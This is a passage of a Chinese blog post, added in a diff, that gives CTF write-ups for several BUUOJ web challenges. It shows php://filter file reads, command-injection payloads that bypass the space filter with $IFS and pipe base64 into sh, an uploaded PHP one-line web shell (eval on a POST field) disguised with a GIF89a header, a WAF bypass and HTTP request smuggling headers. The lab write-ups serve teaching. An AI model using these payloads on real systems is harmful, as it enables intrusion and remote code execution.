+          <a href="#2-抓包" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-抓包" class="headerlink" title="2.抓包"></a>2.抓包</h2>
+      <p>用BurpSuit抓包，发现有一个action.php，里面有个secr3t.php的提示</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091834445.png" alt="image-20220109183459387"></p>
+<p>访问一下secr3t.php</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091835473.png" alt="image-20220109183542434"></p>
+<p>提示放在了flag.php，访问之后发现什么也没有</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091836077.png" alt="image-20220109183616033"></p>
+<p>那么这里由于secr3t.php存在file的协议，所以可以尝试使用php伪协议获取flag.php的源代码</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091837080.png" alt="image-20220109183730031"></p>
+<p>拿到CyberChef解密，得到flag</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091838079.png" alt="image-20220109183825033"></p>
+
+        <h1 id="九、-极客大挑战-2019-LoveSQL"   >
+          <a href="#九、-极客大挑战-2019-LoveSQL" class="heading-link"><i class="fas fa-link"></i></a><a href="#九、-极客大挑战-2019-LoveSQL" class="headerlink" title="九、[极客大挑战 2019]LoveSQL"></a>九、[极客大挑战 2019]LoveSQL</h1>
+      
+        <h1 id="十、-GXYCTF2019-Ping-Ping-Ping"   >
+          <a href="#十、-GXYCTF2019-Ping-Ping-Ping" class="heading-link"><i class="fas fa-link"></i></a><a href="#十、-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="十、[GXYCTF2019]Ping Ping Ping"></a>十、[GXYCTF2019]Ping Ping Ping</h1>
+      
+        <h2 id="🔺命令执行"   >
+          <a href="#🔺命令执行" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺命令执行" class="headerlink" title="🔺命令执行"></a>🔺命令执行</h2>
+      
+        <h2 id="1-前期探索-1"   >
+          <a href="#1-前期探索-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-前期探索-1" class="headerlink" title="1.前期探索"></a>1.前期探索</h2>
+      <p>Ping提示+ip，应该是命令执行，直接ls试试</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=127.0.0.1;ls</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201102003467.png" alt="image-20220110200315404"></p>
+<p>发现flag，尝试cat</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=127.0.0.1;cat flag.php</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201102004540.png" alt="image-20220110200415489"></p>
+
+        <h2 id="2-绕过过滤"   >
+          <a href="#2-绕过过滤" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-绕过过滤" class="headerlink" title="2.绕过过滤"></a>2.绕过过滤</h2>
+      <p>应该是过滤的空格</p>
+<p>▲绕过空格：一般思路如下</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 //其中那个1加其他的应该都行</span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125;</span><br><span class="line">$20</span><br><span class="line">$09(空字符)</span><br></pre></td></tr></table></div></figure>
+
+<p>参考[<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/Cl0ud/p/12313368.html" >GXYCTF2019]Ping Ping Ping - 春告鳥 - 博客园 (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>使用<code>$IFS</code>可以，但是又发现过滤了flag</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201102021256.png" alt="image-20220110202147216"></p>
+<p>那么接下的解法就多种多样了。</p>
+
+        <h3 id="解法一：拼接flag"   >
+          <a href="#解法一：拼接flag" class="heading-link"><i class="fas fa-link"></i></a><a href="#解法一：拼接flag" class="headerlink" title="解法一：拼接flag"></a>解法一：拼接flag</h3>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?ip=127.0.0.1;b=ag.php;a=fl;cat$IFS$1$a$b</span><br></pre></td></tr></table></div></figure>
+
+<p>flag在注释里，查看网页源代码即可</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111127902.png" alt="image-20220111112715736"></p>
+
+        <h3 id="解法二：sh结合base64"   >
+          <a href="#解法二：sh结合base64" class="heading-link"><i class="fas fa-link"></i></a><a href="#解法二：sh结合base64" class="headerlink" title="解法二：sh结合base64"></a>解法二：sh结合base64</h3>
+      
+        <h4 id="▲linux自带base64和base32"   >
+          <a href="#▲linux自带base64和base32" class="heading-link"><i class="fas fa-link"></i></a><a href="#▲linux自带base64和base32" class="headerlink" title="▲linux自带base64和base32"></a>▲linux自带base64和base32</h4>
+      <p>由于linux的sh自带base64的加解密，所以我们可以传入base64的密文，然后利用linux的sh终端自带的base64解密功能进行解密，这样可以在一定程度上绕过很多过滤，另外base32也可以</p>
+
+        <h4 id="1-base64加密"   >
+          <a href="#1-base64加密" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-base64加密" class="headerlink" title="(1)base64加密"></a>(1)base64加密</h4>
+      <p>使用CyberChef或者linux命令行都行</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111136396.png" alt="image-20220111113614306"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111136522.png" alt="image-20220111113634402"></p>
+
+        <h4 id="2-base64解密"   >
+          <a href="#2-base64解密" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-base64解密" class="headerlink" title="(2)base64解密"></a>(2)base64解密</h4>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo Y2F0IGZsYWcucGhwCg== | base64 -d | sh</span><br></pre></td></tr></table></div></figure>
+
+<p>将之前加密的”cat flag.php”传给base64解密，然后sh执行</p>
+<p>对应写在URL上即为</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhwCg==$IFS$9|$IFS$9base64$IFS$9-d$IFS$9|$IFS$9sh</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="解法三：linux内联执行"   >
+          <a href="#解法三：linux内联执行" class="heading-link"><i class="fas fa-link"></i></a><a href="#解法三：linux内联执行" class="headerlink" title="解法三：linux内联执行"></a>解法三：linux内联执行</h3>
+      <p>命令中会先执行反引号里的，然后将输入结果依次传递给其他命令进行执行</p>
+<p>由于flag就在当前文件夹下，所以</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat `ls`;</span><br><span class="line"><span class="comment">#先执行ls输出 index.php 和 flag.php，之后将输入结果给到cat命令，相当于再执行 cat index.php;cat flag.php</span></span><br></pre></td></tr></table></div></figure>
+
+<p>对应URL为</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?ip=127.0.0.1;cat$IFS$9`ls`</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="▲其他"   >
+          <a href="#▲其他" class="heading-link"><i class="fas fa-link"></i></a><a href="#▲其他" class="headerlink" title="▲其他"></a>▲其他</h2>
+      <p>此外命令执行有很多方法可以绕过，这里ban掉了很多，像<code>&lt;</code>，<code>\</code>等都是有可能</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/GLory-LTF/p/15359485.html" >命令执行绕过的方法 - GLCC - 博客园 (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h1 id="十一、-极客大挑战-2019-Knife"   >
+          <a href="#十一、-极客大挑战-2019-Knife" class="heading-link"><i class="fas fa-link"></i></a><a href="#十一、-极客大挑战-2019-Knife" class="headerlink" title="十一、[极客大挑战 2019]Knife"></a>十一、[极客大挑战 2019]Knife</h1>
+      
+        <h2 id="🔺一句话木马"   >
+          <a href="#🔺一句话木马" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺一句话木马" class="headerlink" title="🔺一句话木马"></a>🔺一句话木马</h2>
+      <p>依据提示以及如下的语句，猜测是一句话木马，密码为Syc</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111449555.png" alt="image-20220111144925504"></p>
+<p>使用蚁剑连接</p>
+<p>蚁剑教程：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.yuque.com/antswordproject/antsword/srruro" >获取蚁剑 · 语雀 (yuque.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>然后直接复制URL进行连接即可，右键-&gt;添加数据</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111451527.png" alt="image-20220111145119474"></p>
+<p>进去之后进入根目录寻找flag</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111451771.png" alt="image-20220111145143729"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111452893.png" alt="image-20220111145208831"></p>
+
+        <h1 id="十二、-极客大挑战-2019-Http"   >
+          <a href="#十二、-极客大挑战-2019-Http" class="heading-link"><i class="fas fa-link"></i></a><a href="#十二、-极客大挑战-2019-Http" class="headerlink" title="十二、[极客大挑战 2019]Http"></a>十二、[极客大挑战 2019]Http</h1>
+      
+        <h2 id="🔺使用BurpSuit改包头"   >
+          <a href="#🔺使用BurpSuit改包头" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺使用BurpSuit改包头" class="headerlink" title="🔺使用BurpSuit改包头"></a>🔺使用BurpSuit改包头</h2>
+      
+        <h2 id="1-前期探索-2"   >
+          <a href="#1-前期探索-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-前期探索-2" class="headerlink" title="1.前期探索"></a>1.前期探索</h2>
+      <p>直接源代码，搜索.php，发现一个Secrect.php</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111412036.png" alt="image-20220111141159974"></p>
+<p>然后访问，发现需要从<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://sycsecret.buuoj.cn访问才行/" >https://Sycsecret.buuoj.cn访问才行</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111412596.png" alt="image-20220111141218518"></p>
+<p>那么就使用BurpSuite进行修改</p>
+
+        <h2 id="2-BurpSuite使用改包"   >
+          <a href="#2-BurpSuite使用改包" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-BurpSuite使用改包" class="headerlink" title="2.BurpSuite使用改包"></a>2.BurpSuite使用改包</h2>
+      <p>首先浏览器开启代理，BurpSuite抓到包</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111413501.png" alt="image-20220111141339457"></p>
+<p>然后将包发送到<code>repeater</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111414701.png" alt="image-20220111141424655"></p>
+<p>在Repeater最新出现的一部分就是</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111415489.png" alt="image-20220111141531436"></p>
+
+        <h3 id="1-修改Referer"   >
+          <a href="#1-修改Referer" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-修改Referer" class="headerlink" title="(1)修改Referer"></a>(1)修改Referer</h3>
+      <p>由于说要从<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://sycsecret.buuoj.cn访问,所以添加如下,在get下添加/" >https://Sycsecret.buuoj.cn访问，所以添加如下，在Get下添加</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: https://Sycsecret.buuoj.cn</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111417813.png" alt="image-20220111141726767"></p>
+<p>点击Go按钮发送包</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111418470.png" alt="image-20220111141823417"></p>
+<p>返回的包提示不行，那么需要修改浏览器名称</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111418007.png" alt="image-20220111141837951"></p>
+
+        <h3 id="2-修改User-Agent"   >
+          <a href="#2-修改User-Agent" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-修改User-Agent" class="headerlink" title="(2)修改User-Agent"></a>(2)修改User-Agent</h3>
+      <p>修改如下</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Syclover</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111420138.png" alt="image-20220111142004093"></p>
+<p>还是不行，提示需要从本地local读取</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111420811.png" alt="image-20220111142051767"></p>
+
+        <h3 id="3-修改X-Forwarded-For"   >
+          <a href="#3-修改X-Forwarded-For" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-修改X-Forwarded-For" class="headerlink" title="(3)修改X-Forwarded-For"></a>(3)修改X-Forwarded-For</h3>
+      <p>添加如下</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111422737.png" alt="image-20220111142201689"></p>
+<p>发送后得到flag</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111422352.png" alt="image-20220111142221310"></p>
+
+        <h1 id="十三、-极客大挑战-2019-Upload"   >
+          <a href="#十三、-极客大挑战-2019-Upload" class="heading-link"><i class="fas fa-link"></i></a><a href="#十三、-极客大挑战-2019-Upload" class="headerlink" title="十三、[极客大挑战 2019]Upload"></a>十三、[极客大挑战 2019]Upload</h1>
+      
+        <h2 id="🔺文件上传漏洞、一句话木马"   >
+          <a href="#🔺文件上传漏洞、一句话木马" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺文件上传漏洞、一句话木马" class="headerlink" title="🔺文件上传漏洞、一句话木马"></a>🔺文件上传漏洞、一句话木马</h2>
+      
+        <h2 id="1-前期探索-3"   >
+          <a href="#1-前期探索-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-前期探索-3" class="headerlink" title="1.前期探索"></a>1.前期探索</h2>
+      <p>进入之后发现让选择图片进行上传，那么就考虑一句话木马的隐写，然后再上传</p>
+<p>首先尝试上传.php文件，失败，接着考虑测绕过。</p>
+
+        <h2 id="2-绕过过滤-1"   >
+          <a href="#2-绕过过滤-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-绕过过滤-1" class="headerlink" title="2.绕过过滤"></a>2.绕过过滤</h2>
+      
+        <h3 id="1-修改Content-Type"   >
+          <a href="#1-修改Content-Type" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-修改Content-Type" class="headerlink" title="(1)修改Content-Type"></a>(1)修改Content-Type</h3>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121202373.png" alt="image-20220112120212319"></p>
+<p>失败，后缀名不能为.php</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121202287.png" alt="image-20220112120239252"></p>
+
+        <h3 id="2-修改后缀名"   >
+          <a href="#2-修改后缀名" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-修改后缀名" class="headerlink" title="(2)修改后缀名"></a>(2)修改后缀名</h3>
+      <p>修改为phtml，这种格式在服务器也会被作为php文件解析。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121204190.png" alt="image-20220112120451143"></p>
+<p>成功，但是不能是<code>&lt;?</code>开头，那么尝试使用html格式。还有的php文件后缀名可以修改如下</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">- 利用中间件解析漏洞绕过检查，实战常用</span><br><span class="line">- 上传.user.ini或.htaccess将合法拓展名文件当作php文件解析</span><br><span class="line">- %00截断绕过</span><br><span class="line">- php3文件</span><br><span class="line">- php4文件</span><br><span class="line">- php5文件</span><br><span class="line">- php7文件</span><br><span class="line">- phtml文件</span><br><span class="line">- phps文件</span><br><span class="line">- pht文件</span><br></pre></td></tr></table></div></figure>
+
+<p>[<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/yesec/p/12403922.html" >BUUOJ记录] [ACTF2020 新生赛]Upload - Ye’sBlog - 博客园 (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h3 id="3-修改php格式"   >
+          <a href="#3-修改php格式" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-修改php格式" class="headerlink" title="(3)修改php格式"></a>(3)修改php格式</h3>
+      <p>修改内容为</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;shell&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121206053.png" alt="image-20220112120616999"></p>
+<p>成功，但是也被探测到，那么尝试修改文件头部格式</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121207056.png" alt="image-20220112120712009"></p>
+
+        <h3 id="4-尝试修改文件头部"   >
+          <a href="#4-尝试修改文件头部" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-尝试修改文件头部" class="headerlink" title="(4)尝试修改文件头部"></a>(4)尝试修改文件头部</h3>
+      <p>在文件头加上<code>GIF89a</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121210799.png" alt="image-20220112121007758"></p>
+<p>上传成功</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121210905.png" alt="image-20220112121056862"></p>
+
+        <h2 id="3-查找上传文件路径"   >
+          <a href="#3-查找上传文件路径" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-查找上传文件路径" class="headerlink" title="3.查找上传文件路径"></a>3.查找上传文件路径</h2>
+      <p>一般而言，上传的都在upload，成功找到</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121213219.png" alt="image-20220112121305153"></p>
+<p>那么蚁剑连接，根目录下找到flag</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121218740.png" alt="image-20220112121815697"></p>
+
+        <h1 id="十四、-ACTF2020-新生赛-Upload"   >
+          <a href="#十四、-ACTF2020-新生赛-Upload" class="heading-link"><i class="fas fa-link"></i></a><a href="#十四、-ACTF2020-新生赛-Upload" class="headerlink" title="十四、[ACTF2020 新生赛]Upload"></a>十四、[ACTF2020 新生赛]Upload</h1>
+      <p>和十三题一样，直接一句话木马，文件格式为phtml，修改content-type即可，然后蚁剑连上在根目录下找flag。需要注意的是要先上传成功一个文件才会抓到上传的包，因为这里的验证是在前端验证后缀名的。</p>
+
+        <h1 id="十五、-RoarCTF-2019-Easy-Calc"   >
+          <a href="#十五、-RoarCTF-2019-Easy-Calc" class="heading-link"><i class="fas fa-link"></i></a><a href="#十五、-RoarCTF-2019-Easy-Calc" class="headerlink" title="十五、[RoarCTF 2019]Easy Calc"></a>十五、[RoarCTF 2019]Easy Calc</h1>
+      
+        <h2 id="🔺命令执行、php字符串解析、HTTP走私攻击"   >
+          <a href="#🔺命令执行、php字符串解析、HTTP走私攻击" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺命令执行、php字符串解析、HTTP走私攻击" class="headerlink" title="🔺命令执行、php字符串解析、HTTP走私攻击"></a>🔺命令执行、php字符串解析、HTTP走私攻击</h2>
+      
+        <h2 id="1-前期探索-4"   >
+          <a href="#1-前期探索-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-前期探索-4" class="headerlink" title="1.前期探索"></a>1.前期探索</h2>
+      <p>查看源代码，发现如下.php文件</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121906058.png" alt="image-20220112190657868"></p>
+<p>访问一下，发现源代码，分析过滤了一些东西，然后我们输入的num字符串进行解析，并且使用eval执行后输出</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121912749.png" alt="image-20220112191231694"></p>
+<p>主要以下代码，过滤了很多东西，然后执行输出</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>)</span><br></pre></td></tr></table></div></figure>
+
+<p>尝试phpinfo()，发现直接报错，大佬们说是Waf的原因，具体也不太知道怎么判断出Waf的，经过测试，这里的waf会过滤掉所有带字母的num变量内容。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131203691.png" alt="image-20220113115855930"></p>
+<p>所以大概有两种方法</p>
+
+        <h2 id="2-解决方法"   >
+          <a href="#2-解决方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-解决方法" class="headerlink" title="2.解决方法"></a>2.解决方法</h2>
+      
+        <h3 id="解法一：利用php字符串解析特性绕过WAF"   >
+          <a href="#解法一：利用php字符串解析特性绕过WAF" class="heading-link"><i class="fas fa-link"></i></a><a href="#解法一：利用php字符串解析特性绕过WAF" class="headerlink" title="解法一：利用php字符串解析特性绕过WAF"></a>解法一：利用php字符串解析特性绕过WAF</h3>
+      
+        <h4 id="1-绕过WAF"   >
+          <a href="#1-绕过WAF" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-绕过WAF" class="headerlink" title="(1)绕过WAF"></a>(1)绕过WAF</h4>
+      <p>利用php解析字符串时，会自动去掉多余的空格这个特性，即当我们调试时</p>
+<p>输入中间加入了空格的num，发现php依然能够成功解析出num这个变量</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index.php?%20num=phpinfo()</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131156038.png" alt="image-20220113115626996"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131156886.png" alt="image-20220113115655830"></p>
+<p>但是WAF可不会管空不空格的，对于Waf来说，传过去的是带了空格的num变量，不是num变量，所以不会进行过滤，会将带了空格的num变量传递给calc.php文件进行解析，这样就成功绕过了WAF。</p>
+
+        <h4 id="2-绕过过滤-2"   >
+          <a href="#2-绕过过滤-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-绕过过滤-2" class="headerlink" title="(2)绕过过滤"></a>(2)绕过过滤</h4>
+      <p>由于过滤了<code>/</code>，所以这里使用<code>chr(47)</code>来进行绕过，这是<code>/</code>字符的ascii码</p>
+<p>先查看根目录下有什么内容</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/calc.php?%20num=var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></div></figure>
+
+<p>发现有flag</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131211277.png" alt="image-20220113121152229"></p>
+<p>那么利用php中的函数进行获取</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</span><br></pre></td></tr></table></div></figure>
+
+<p>得到flag</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131212797.png" alt="image-20220113121256750"></p>
+
+        <h3 id="解法二：利用HTTP走私攻击"   >
+          <a href="#解法二：利用HTTP走私攻击" class="heading-link"><i class="fas fa-link"></i></a><a href="#解法二：利用HTTP走私攻击" class="headerlink" title="解法二：利用HTTP走私攻击"></a>解法二：利用HTTP走私攻击</h3>
+      <p>这个具体的原理实在是有点不太能理解，可能需要深入研究一下。以我的理解来说，就是通过修改<code>content-length</code>或者<code>Transfer-Encoding</code>，来使得数据包在前后端解析的过程中，让前端以为该数据包的内容比较少，使其认为不包含需要过滤的内容，从而把完整的数据包发给后端，绕过前端的Waf等过滤。</p>
+<p>BurpSuit抓包之后，修改<code>content-length</code>或者<code>Transfer-Encoding</code></p>
+
+        <h4 id="1-利用CL-CL"   >
+          <a href="#1-利用CL-CL" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-利用CL-CL" class="headerlink" title="(1)利用CL-CL"></a>(1)利用CL-CL</h4>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131507999.png" alt="image-20220113150704935"></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Length: 0</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></div></figure>
+
+
+        <h4 id="2-利用CL-TE"   >
+          <a href="#2-利用CL-TE" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-利用CL-TE" class="headerlink" title="(2)利用CL-TE"></a>(2)利用CL-TE</h4>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131518370.png" alt="image-20220113151848304"></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 3</span><br></pre></td></tr></table></div></figure>
+
+<p>有时候又很奇怪，就离谱。</p>
+<p>同时GET改成POST也是可以的。</p>
+<p>后面都一样了，就是绕过后端的过滤。</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://websec.readthedocs.io/zh/latest/vuln/httpSmuggling.html" >4.17. HTTP 请求走私 — Web安全学习笔记 1.0 文档 (websec.readthedocs.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://PIG-007.github.io">PIG-007</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://pig-007.github.io/2022/01/06/%E9%99%AAXX%E7%9A%84WebBUU%E5%88%B7%E9%A2%98(%E4%B8%80)/">http://pig-007.github.io/2022/01/06/%E9%99%AAXX%E7%9A%84WebBUU%E5%88%B7%E9%A2%98(%E4%B8%80)/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" 